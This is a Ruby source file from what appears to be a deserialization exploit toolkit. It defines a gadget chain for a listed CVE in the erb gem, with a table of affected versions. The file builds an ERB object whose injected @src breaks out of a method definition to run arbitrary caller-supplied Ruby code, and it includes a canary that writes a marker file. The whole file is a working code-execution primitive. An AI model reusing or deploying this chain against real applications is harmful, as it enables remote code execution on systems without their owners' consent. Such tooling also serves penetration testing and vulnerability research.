# ©AngelaMos | 2026
# erb_def_method.rb
# frozen_string_literal: true

require "erb"

module Marshalsea
  module Chains
    class ErbDefMethod < Base
      CHAIN_NAME = "erb-def-method"
      VECTOR = "def_method"
      CVE = "CVE-2026-41316"
      TARGET_GEM = "erb"

      AFFECTED = [
        ["< 4.0.3.1"],
        ["= 4.0.4"],
        [">= 5.0.0", "< 6.0.1.1"],
        [">= 6.0.2", "< 6.0.4"]
      ].map { |constraints| constraints.map(&:freeze).freeze }.freeze

      SRC_PREFIX = "#\nend\n"
      SRC_SUFFIX = "\ndef _marshalsea_unused\n"
      DEFAULT_FILENAME = "(erb)"
      DEFAULT_LINENO = 0

      IVAR_SRC = :@src
      IVAR_FILENAME = :@filename
      IVAR_LINENO = :@lineno

      CANARY_TEMPLATE = "File.write(%<path>p, %<marker>p)"

      METADATA = {
        name: CHAIN_NAME,
        vector: VECTOR,
        cve: CVE,
        gem: TARGET_GEM,
        affected: AFFECTED,
        kind: KIND_PRIMITIVE
      }.freeze

      def self.metadata
        METADATA
      end

      def self.canary(path, marker)
        new(format(CANARY_TEMPLATE, path: path, marker: marker))
      end

      def initialize(ruby_source)
        super()
        @ruby_source = ruby_source
      end

      def generate
        object = ERB.allocate
        object.instance_variable_set(IVAR_SRC, src)
        object.instance_variable_set(IVAR_FILENAME, DEFAULT_FILENAME)
        object.instance_variable_set(IVAR_LINENO, DEFAULT_LINENO)
        object
      end

      def src
        "#{SRC_PREFIX}#{@ruby_source}#{SRC_SUFFIX}"
      end

      private

      attr_reader :ruby_source
    end
  end
end
